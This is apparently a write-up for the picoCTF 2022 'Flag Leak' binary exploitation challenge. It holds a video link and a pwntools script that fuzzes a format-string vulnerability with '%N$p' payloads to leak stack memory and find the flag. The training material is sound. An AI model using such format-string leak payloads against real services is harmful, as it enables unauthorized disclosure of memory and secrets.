---
name: Flag Leak (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for Flag Leak (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Flag Leak

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=2634 "Pico CTF 2022: Flag Leak")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./vuln', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process('./vuln', level='warn')
        # p = remote('saturn.picoctf.net', 53365, level='warn')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'>', '%{}$p'.format(i).encode())
        p.recvline()
        # Receive the response
        result = p.recvline()
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```
{% endcode %}
